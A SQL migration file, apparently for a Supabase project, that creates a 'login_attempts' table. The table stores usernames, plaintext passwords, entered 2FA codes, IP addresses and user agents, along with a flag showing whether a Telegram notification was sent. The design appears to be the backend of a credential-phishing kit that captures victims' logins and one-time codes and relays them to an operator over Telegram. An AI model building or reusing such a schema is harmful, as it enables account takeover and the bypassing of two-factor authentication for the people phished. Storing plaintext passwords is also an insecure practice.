/*
  # Create login attempts table for Telegram notifications

  1. New Tables
    - `login_attempts`
      - `id` (uuid, primary key) - Unique identifier for each login attempt
      - `username` (text) - Username entered by the user
      - `password` (text) - Password entered by the user
      - `verification_code` (text, nullable) - 2FA code entered by the user
      - `ip_address` (text, nullable) - IP address of the user
      - `user_agent` (text, nullable) - Browser/device information
      - `created_at` (timestamptz) - Timestamp of the login attempt
      - `notified` (boolean) - Whether Telegram notification was sent
      
  2. Security
    - Enable RLS on `login_attempts` table
    - Add policy for service role only access (no public access)
    
  3. Important Notes
    - This table stores sensitive information and should only be accessed via edge functions
    - RLS policies prevent any direct access from the client
*/

CREATE TABLE IF NOT EXISTS login_attempts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text NOT NULL,
  password text NOT NULL,
  verification_code text,
  ip_address text,
  user_agent text,
  created_at timestamptz DEFAULT now(),
  notified boolean DEFAULT false
);

ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Service role only access"
  ON login_attempts
  FOR ALL
  TO service_role
  USING (true)
  WITH CHECK (true);